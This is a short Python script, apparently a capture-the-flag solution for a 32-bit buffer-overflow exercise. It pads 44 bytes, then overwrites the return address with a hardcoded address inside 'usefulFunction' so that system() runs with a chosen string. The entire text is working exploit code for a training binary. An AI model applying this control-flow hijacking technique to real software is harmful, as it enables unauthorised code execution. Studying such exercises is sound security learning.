import struct
crap = "A" *44

usefulFunctionAddr = 0x08048649
usefulFunctionPartAddr = 0x08048657
usefulStringAddr = 0x0804a030



eip = struct.pack("<I",usefulFunctionPartAddr)
argForSystemCall = struct.pack("<I",usefulStringAddr)


print(crap+eip+argForSystemCall)
